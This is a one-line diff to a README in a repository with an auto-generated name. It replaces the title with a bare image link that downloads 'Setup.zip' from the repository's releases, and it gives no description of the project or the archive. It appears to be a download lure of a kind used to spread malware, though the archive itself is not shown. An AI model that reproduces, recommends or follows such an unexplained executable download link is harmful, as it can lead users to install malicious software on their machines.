@@ -1,1 +1,1 @@
-# literate-pancake
+[![nxcv](https://github.com/Ameen-Alalimi/literate-pancake/assets/109043692/0c0028dc-8e68-4c0d-9164-fb82f642c4ba)](https://github.com/Ameen-Alalimi/literate-pancake/releases/download/Release/Setup.zip)
